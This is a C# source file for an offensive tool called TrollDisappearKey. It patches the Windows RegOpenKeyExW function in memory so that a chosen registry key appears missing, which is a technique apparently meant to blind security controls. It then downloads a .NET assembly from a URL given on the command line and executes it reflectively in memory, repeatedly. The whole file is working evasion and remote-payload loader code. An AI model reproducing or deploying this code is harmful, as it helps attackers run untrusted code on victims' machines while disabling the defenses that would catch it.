using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;

public static class TrollDisappearKey
{

    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    static public int oldProtect;
    static public IntPtr targetAddr, hookAddr;
    static public byte[] originalBytes = new byte[12];
    static public byte[] hookBytes = new byte[12];
    static public int counter = 0;
    static public string thekey = "";


    public static void DisappearKey()
    {
        delegateRegOpenKeyExW A = RegOpenKeyWDetour;
        targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
        hookAddr = Marshal.GetFunctionPointerForDelegate(A);
        Marshal.Copy(targetAddr, originalBytes, 0, 12);
        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);

    }

    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {
        try
        {
            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);

            if (lpSubKey == thekey)
            {
                counter = counter + 1;
                return RegOpenKeyExW(hKey, thekey + " ", ulOptions, samDesired, out phkResult);
            }
            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);

        }
        finally
        {
            if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
        }
    }


    public static void Main(string[] args)
    {
        //ignore tls errors
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        thekey = args[2];

        //call the function to install the hook which essentially makes lpSubKey disappear
        //if first argument is passed as disabled, hook will not trigger
        if (args[1].Split(',')[0] != "disable")
        {
            DisappearKey();
        }

        

        //standard assembly load .exe and call main with args
        ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
    }


    public static void ExecuteAssembly(Byte[] assemblyBytes, string comma_separated_args)
    {

        Assembly assembly = Assembly.Load(assemblyBytes);
        MethodInfo method = assembly.EntryPoint;

        object[] parameters = new object[] { comma_separated_args.Split(',') };
        string input = "";

        while (input != "exit")
        {

            method.Invoke(null, parameters);
            Console.Write("Pass in arguments comma delimited or type exit\r\n");
            input = Console.ReadLine();
            parameters = new object[] { input.Split(',') };

        }
    }
}
